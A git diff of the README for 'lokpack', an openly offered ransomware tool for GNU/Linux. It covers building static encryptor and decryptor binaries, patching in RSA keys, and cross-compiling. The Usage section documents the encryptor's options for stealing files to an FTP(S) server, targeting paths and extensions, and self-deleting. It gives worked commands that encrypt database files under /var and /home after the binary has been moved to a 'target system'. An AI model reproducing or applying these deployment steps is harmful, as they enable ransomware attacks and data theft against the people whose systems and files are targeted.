@@ -1,25 +1,42 @@
-# lokpack | ransomware for GNU/Linux
+# lokpack | ransomware tooling for GNU/Linux
 
-lokpack is a free ransomware for modern GNU/Linux systems, written in C
+lokpack is a free ransomware for modern GNU/Linux systems, written in C.
 
 ![showcase](https://github.com/ngn13/lokpack/assets/78868991/d1d8e490-b7d3-4f21-aeca-368eb0a0a0d8)
 
 ## Features
 
-- Build static encryption and decrypiton tools
+- Build static encryption and decryption tools
 - Steal files using a FTP(S) server
-- Specify custom target paths
-- Uncrackable RSA asymmetric encryption
-- Multi-threaded (a.k.a. fast)
+- Specify custom target paths and extensions
+- Uncrackable encryption with 8192 bit RSA and AES-256
+- Fully multi-threaded
+
+## Tested on...
+
+Latest release is automatically tested weekly on the latest Ubuntu LTS using
+github actions. I also manually tested the latest release on the following
+systems:
+
+- Arch Linux 2025-06-02, x86-64
+- Ubuntu 24.04.2 LTS (Noble Numbat), x86-64
+- FreeBSD 14.2-RELEASE, i386
+
+If you experience issues on any GNU/Linux system, feel free to create an issue.
+This project does not target BSD systems, however if you experience any issues
+on popular BSD systems (FreeBSD, NetBSD, OpenBSD etc.) I can try to fix them as
+well.
 
 ## Installation
 
 ### Binary builds
 
-You can download the latest release archive, which contains a static build of
-the encryptor and the decryptor, **without SSL/TLS** support. After downloading
-and extracting the archive, run the `patch.py` script to replace the
-private/public keys:
+Binary builds (automatically built with github actions) are published for each
+release. These releases contain static, cross-compiled built encryptor and
+decryptor binaries with a randomly generated RSA key pair.
+
+Each release also contains a simple python(3) patch script, which you can use to
+generate a new RSA key pair and replace the pair contained in the binaries:
 
 ```bash
 # make sure you have pycryptodome installed
@@ -28,52 +45,92 @@ python3 patch.py
 
 ### From the source
 
-Required libraries/tools are:
+#### Setup
 
-- A (x86_64) Linux system
-- gcc and other build tools
+- A GNU/Linux system, you may also be able to build on BSD systems
+- GCC, GNU make and other GNU build tools
 - curl (and headers)
-- openssl (and headers)
+- OpenSSL (and headers)
 
-> [!WARNING] Do NOT build from the latest commit, check out the latest tag or
-> download the [latest release](https://github.com/ngn13/lokpack/releases).
+**If you want to cross-compile the binaries for a different system**, you'll
+will need the cross-compilation tools for the target system. **If your distro
+does not package cross-compilation tools**, you can build them yourself. After
+building them you should specify their paths with environment variables, for
+example:
 
-To generate static builds, you will need static libraries of curl and openssl,
-**if your distro does not package these**, you can build them yourself or use
-the automated build scripts:
+```bash
+export CC=/opt/cross/bin/x86_64-linux-gnu-gcc
+export LD=/opt/cross/bin/x86_64-linux-gnu-ld
+export AS=/opt/cross/bin/x86_64-linux-gnu-as
+```
+
+You should also add path of the cross-compilation headers to the include path:
+
+```bash
+export C_INCLUDE_PATH=/opt/cross/include
+```
+
+**If you want to static binaries**, you will also need static libraries of curl
+and OpenSSL. **If your distro does not package these**, you can build them
+yourself or use the automated build scripts:
 
 ```bash
 ./scripts/openssl.sh
 ./scripts/curl.sh
 ```
 
-**Note that automated script for curl does not support SSL/TLS connections**.
+#### Build
 
-After building the static libraries, use the build script to create build with a
-random key:
+For a static build (requires static libraries) with a randomly generated RSA key
+pair:
 
 ```bash
 ./scripts/build.sh -static
 ```
 
-This should create the `encryptor` and the `decryptor` binares at `dist/`.
+For a local build (requires shared libraries) with a randomly generated RSA key
+pair:
+
+```bash
+./scripts/build.sh -local
+```
+
+Both of these should create the `encryptor` and the `decryptor` binaries at
+`dist/`.
+
+You can also build the binaries with an hardcoded key pair, and later patch them
+using the `patch.py` script, which is located under the scripts directory:
+
+```bash
+make
+cd dist && python3 ../scripts/patch.py
+```
+
+This also let's you customize different build options:
+
+```bash
+make LP_QUEUE_MAX=400
+```
+
+You can get a full list of these build options by running `make help`.
 
 ## Usage
 
-After transfering `encryptor` to the target system, you can specify custom
+After transferring `encryptor` to the target system, you can specify custom
 options:
 
 ```bash
 $ ./encryptor --help
 [*] Listing available options:
-    --threads  => Thread count for the thread pool
-    --paths    => Paths to look for files
-    --exts     => Valid extensions for files
-    --ftp-url  => Address for the FTP(S) server
-    --ftp-user => FTP(S) username
-    --ftp-pwd  => FTP(S) password
-    --no-ftp   => Disable stealing files with FTP(S)
-    --destruct => Self destruct the program
+    --threads   => Thread count for the thread pool
+    --paths     => Target paths (directories/files)
+    --exts      => Target file extensions
+    --ftp-url   => Address for the FTP(S) server
+    --ftp-user  => FTP(S) username
+    --ftp-pwd   => FTP(S) password
+    --no-ftp    => Disable stealing files with FTP(S)
+    --no-bar    => Disable simple ASCII progress bar
+    --destruct  => Self destruct (delete) the program
 ```
 
 For example to encrypt `.sql` and `.db` files located at `/var` and `/home`
@@ -83,10 +140,12 @@ without FTP using 100 threads:
 ./encryptor --threads=100 --paths=/var,/home --exts=sql,db --no-ftp
 ```
 
-If you want to encrypt all files with all extensions, set `--exts` to `ALL`.
+If you want to encrypt all files with all extensions, use the `--exts` options
+with an empty value, so just `--exts=`.
 
-Decryptor does not have any options, but can specify the target directory, by
-default it searches the entire file system (`/`):
+Decryptor does not have any options, you only need to specify a target directory
+or a file to decrypt. For example to decrypt all the encrypted files in `/var`,
+you can run:
 
 ```bash
 ./decryptor /var
@@ -94,8 +153,8 @@ default it searches the entire file system (`/`):
 
 ### Setting up FTP(S)
 
-For an actual FTP(S) setup you should install a FTP daemon such as `vsftpd` or
-`bftpd`. But for testing you can use `pyftpdlib`:
+For an actual FTP(S) setup you should install and configure a FTP daemon such as
+`vsftpd`. But for testing you can use `pyftpdlib`:
 
 ```bash
 # username and password are 'anonymous'
@@ -104,9 +163,33 @@ python3 -m pyftpdlib -w
 # -w for write access
 ```
 
-## Resources
+## Development
 
-- [C-Thread-Pool](https://github.com/Pithikos/C-Thread-Pool)
-- [CURL ftpupload](https://curl.se/libcurl/c/ftpupload.html)
-- [CURL options](https://curl.se/libcurl/c/easy_setopt_options.html)
-- [OpenSSL RSA Demo](https://github.com/openssl/openssl/blob/master/demos/encrypt/rsa_encrypt.c)
+After making any changes to the source code, make sure the format the code and
+check for any linting errors (requires a recent version of `clang-format` and
+`clang-tidy`):
+
+```bash
+make format # fix formatting
+make check # check for formatting and linting errors
+```
+
+Make sure the fix any reported issues. Also make sure to test the binaries using
+the `scripts/test.sh` script (requires `openssl` and `pyftpdlib`):
+
+```bash
+make test
+```
+
+If you experience any issues, enable the debug messages, compile the binaries
+with debug messages. This might help you to quickly spot the issue:
+
+```bash
+make LP_DEBUG=1 # uses hardcoded key pair
+# or...
+./scripts/build.sh -debug # uses random key pair
+```
+
+---
+
+Don't do crime!
